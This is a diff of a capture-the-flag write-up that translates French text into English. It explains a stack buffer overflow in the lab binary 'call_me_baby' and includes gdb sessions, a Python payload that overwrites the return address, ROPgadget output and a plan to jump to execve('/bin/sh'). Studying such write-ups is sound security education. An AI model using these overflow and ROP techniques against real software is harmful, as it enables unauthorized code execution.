@@ -95,7 +95,7 @@ End of assembler dump.
 Breakpoint 2 at 0x40120a
 ```
 
-Now we'll input 64 characters to fill local_48, and inspect the register to see how many bytes we need to write over before reaching the rbp :
+Now we'll input 64 characters to fill up local_48, and inspect the register to see how many bytes we need to write over before reaching the rbp :
 
 ```gdb
 (gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64)')
@@ -139,63 +139,54 @@ fs             0x0                 0
 gs             0x0                 0
 ```
 
-The `x/24wx $rsp` is printing out the stack, we can easily spot the "\x41" characters we gave to the program. Next we use the `info register` command to print out the register and find out where the rbp is : `rbp            0x7fffffffda00`. Looking at the stack, we can see that the rbp is right next to our input. We'll only need to write over the rbp (8 bytes) to reach the return address.
+The `x/24wx $rsp` command is printing out the stack, we can easily spot the "\x41" characters we gave to the program. Next we use the `info register` command to print out the register and find out where the rbp is : `rbp            0x7fffffffda00`. Looking at the stack, we can see that the rbp is right next to our input. We'll only need to write over the rbp (8 bytes) to reach the return address.  
 
-L'addresse à laquelle les fonctions se redirigent après leur execution est stocké après le rbp dans la stack. En regardant le registre et l'adresse à laquelle le rbp est stocké, on déduit le payload pour rediriger le programme :
+
+Now let's find out the address of the call_me() function we want to reach :
 
 ```gdb
-(gdb) break *call_me
-Breakpoint 3 at 0x40118a
 (gdb) info func call_me
 All functions matching regular expression "call_me":
 
 Non-debugging symbols:
 0x000000000040118a  call_me
+```
+
+The address is : `0x000000000040118a`. Let's rewrite our payload, we'll need to input 64 characters to write over local_48, 8 characters to write over the rbp, and then give a pointer to the call_me() function (in reverse since we're on a [little endian system](https://en.wikipedia.org/wiki/Endianness)) :
+
+```gdb
 (gdb) r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x41"*8+b"\x8a\x11\x40\x00"+b"\x00"*4)')
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 Starting program: /home/coucou/Documents/CTF_SSI_2024/Call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x41"*8+b"\x8a\x11\x40\x00"+b"\x00"*4)')
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-
-Breakpoint 1, 0x00000000004011dd in vuln ()
-(gdb) c
-Continuing.
-Write your love letter: 
-
-Breakpoint 2, 0x000000000040120a in vuln ()
-(gdb) c
-Continuing.
-
-Breakpoint 3, 0x000000000040118a in call_me ()
-(gdb) c
-Continuing.
 ... I said call me baby !!!!
 
 Program received signal SIGSEGV, Segmentation fault.
 0x00007fffffffdb0a in ?? ()
 ```
 
-On redirige bien le programme vers la fonction call_me(), mais ne passe pas la condition suivante :
+Looking back at our static analysis and the call_me() function we understand that we're reaching the function, but not passing this condition :
 
 ```C
   iVar1 = strcmp((char *)&local_10,"baby");
   if (iVar1 == 0) {
 ```
 
-Pour passer cette condition il faut que la variable local_10 prise en argument par la fonction call_me() soit égale à `baby`.  
+To pass this condition, we need to modify local_10, which is a variable taken as argument to the call_me() function. 
   
-Deux solutions possibles :
- - Soit modifier le registre pour passer `baby` en argument à la fonction call_me
- - Soit directement rediriger le programme vers l'instruction `execve("/bin/sh",(char **)0x0,(char **)0x0);`
+To do so, we should either :
+ - modify the register to modify the argument given to call_me() when wa call it
+ - directly redirect the program towards the instruction `execve("/bin/sh",(char **)0x0,(char **)0x0);`
 
-(La deuxième solution est bien plus rapide, allez directement la voir si voulez la solution simple).
+(The second solution being easier, directly go there if you want the simplest approch).
 
 ### Solution 1
 
-Pour modifier rdi on peut utiliser [un gadget](./https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/gadgets), qui sont des instructions comme `pop rdi; ret` permettant de modifier le registre.
+To modify the register we can use [gadgets](./https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/gadgets), which are instructions such as `pop rdi; ret`.
 
-Utilison l'outil ROPgadgets pour en trouver :
+Since rdi is used to store the argument given to call_me(), let's use ROPGadgets to find a way to modify rdi :
 
 ```bash
 $ ROPgadget --binary call_me_baby | grep 'rdi'
@@ -206,8 +197,9 @@ $ ROPgadget --binary call_me_baby | grep 'rdi'
 0x0000000000401166 : push rbp ; mov rbp, rsp ; pop rdi ; ret
 ```
 
-On trouve `pop rdi; ret` qui est exactement ce que l'on souhaite. Allons voir dans gdb :
-
+We found `pop rdi; ret` which is exaclty what we want : the `pop rdi` instruction is save the last value on the stack into rdi, and the `ret` instruction will redirect the program towards the next value in the stack.  
+  
+Let's look at the instructions 
 ```gdb
 (gdb) x/5wi 0x000000000040116a
    0x40116a <gadgets+4>:	pop    %rdi
